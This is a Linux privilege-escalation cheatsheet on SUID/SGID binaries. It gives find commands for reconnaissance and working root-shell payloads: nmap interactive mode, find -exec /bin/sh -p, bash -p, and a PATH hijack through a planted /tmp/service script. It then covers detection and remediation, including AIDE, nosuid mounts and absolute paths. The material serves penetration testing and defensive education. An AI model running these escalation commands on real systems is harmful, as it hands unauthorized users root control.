## 🗝️ Cheatsheet: SUID/SGID Privilege Escalation

SUID (**Set User ID**) and SGID (**Set Group ID**) are special Linux file permissions. When an executable with the SUID bit is run, it executes with the permissions of the **file owner**, not the user who ran it. If the owner is `root`, the process runs as `root`. This is a necessary feature for some system tasks (like `passwd` changing the password file), but it is extremely dangerous if misconfigured.

### ## What to Look For (Reconnaissance)

The first step is to find all SUID/SGID executables on the system. The `find` command is the perfect tool for this.

* **Find SUID Binaries:** (Permission bit `4000`)
    ```bash
    find / -perm -u=s -type f 2>/dev/null
    # -perm -u=s: Find files with the SUID bit set.
    # -type f: Only look for files.
    # 2>/dev/null: Suppress "Permission denied" errors.
    ```

* **Find SGID Binaries:** (Permission bit `2000`)
    ```bash
    find / -perm -g=s -type f 2>/dev/null
    ```
* **What to Analyze:** Look for non-standard binaries in the list. Everyone has `passwd`, `ping`, and `su`. But if you see something like `nmap`, `find`, `vim`, or a custom script with the SUID bit set, you've likely found a vulnerability.

---

### ## Common Exploitable Scenarios & Payloads

Once you find an interesting SUID binary, the goal is to make it do something it wasn't intended to do, like spawn a shell or overwrite a critical file. **GTFOBins** is your best friend here.

#### **Scenario 1: Binaries with Shell Escapes or File Overwrites**
Many common utilities can be abused to get a shell or modify files when run as root.

* **Binary:** `nmap` (older versions)
    * **Exploitation:** If `nmap` is SUID, you can use its interactive mode to get a shell.
        ```bash
        nmap --interactive
        # At the nmap prompt, type: !sh
        ```
* **Binary:** `find`
    * **Exploitation:** `find` can execute commands, including spawning a shell.
        ```bash
        # Create a dummy file first
        touch shell
        find shell -exec /bin/sh -p \;
        # The -p flag is important to keep the effective UID (root)
        ```
* **Binary:** `bash`
    * **Exploitation:** If you find `bash` with the SUID bit, it's game over.
        ```bash
        bash -p
        # The -p flag tells bash not to drop its elevated privileges.
        ```
* **Other common targets:** `vim` (can edit any file, e.g., `/etc/sudoers`), `cp` (can overwrite any file), `mv` (can replace any file).

#### **Scenario 2: PATH Variable Abuse**
If an SUID binary calls another command without a full path, you can exploit it.

* **Vulnerable Code (in C):** `system("service apache2 restart");`
* **Exploitation:**
    1.  Create a malicious script named `service` in a writable directory like `/tmp`.
        ```bash
        echo '#!/bin/bash' > /tmp/service
        echo '/bin/bash -p' >> /tmp/service
        chmod +x /tmp/service
        ```
    2.  Prepend `/tmp` to your system's `$PATH`.
        ```bash
        export PATH=/tmp:$PATH
        ```
    3.  Run the SUID binary. It will now execute your `/tmp/service` script as `root`.

---

### ## 🛡️ Detection & Remediation (For Defenders)

#### **How to Detect an Attempt**

* **File Integrity Monitoring:** Use tools like **AIDE** or **Tripwire**. These tools create a baseline of your file system and can alert you if file permissions change, such as a new SUID bit being set on a file.
* **Auditing:** Periodically run the `find` commands from the reconnaissance section and compare the output to a list of known, legitimate SUID/SGID files on your system.
* **Process Auditing:** Monitor for strange process chains, for example a low-privilege user spawning a process (`find`, `nmap`) that is running as `root`.

#### **How to Prevent SUID Abuse**

* **Principle of Least Privilege:** Remove the SUID/SGID bit from any binary that does not absolutely need it.
    ```bash
    # Remove the SUID bit from a file
    sudo chmod u-s /path/to/vulnerable_binary
    ```
* **Use the `nosuid` Mount Option:** This is a powerful preventative control. Mount partitions where users can write files (like `/home`, `/tmp`, `/dev/shm`) with the `nosuid` option. This tells the kernel not to respect the SUID bit for any file on that partition.
    * **Example `/etc/fstab` entry:**
        ```
        # Add 'nosuid' to the options
        /dev/sda3   /home   ext4    defaults,nosuid  1 2
        ```
* **Write Secure Code:** When developing applications that require elevated privileges, never call system commands without using their full, absolute path (e.g., use `/usr/sbin/service` instead of just `service`).
